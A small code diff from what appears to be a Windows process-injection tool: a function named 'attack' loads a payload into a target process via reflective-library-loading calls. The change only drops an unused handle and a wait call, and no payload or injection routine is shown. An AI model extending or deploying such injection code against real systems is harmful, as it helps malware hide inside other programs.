@@ -85,7 +85,6 @@ void exiting() {
 void attack(unsigned int pid, unsigned int tid, int method, int payload_type)
 {
 	HANDLE hFile = NULL;
-	HANDLE hModule = NULL;
 	HANDLE hProcess = NULL;
 
 
@@ -129,10 +128,10 @@ void attack(unsigned int pid, unsigned int tid, int method, int payload_type)
 	// using various method for alternative LoadLibrary API
 	switch (method) {
 	case 1:
-		hModule = LoadRemoteLibraryR(payload_type, hProcess);
+		LoadRemoteLibraryR(payload_type, hProcess);
 		break;
 	case 2:
-		hModule = LoadRemoteLibraryR2(payload_type, hProcess);
+		LoadRemoteLibraryR2(payload_type, hProcess);
 		break;
 	case 3:
 		if (tid == 0) {
@@ -161,7 +160,6 @@ void attack(unsigned int pid, unsigned int tid, int method, int payload_type)
 		break;
 	}
 
-	WaitForSingleObject(hModule, -1);
 
 	if (hProcess)
 		CloseHandle(hProcess);
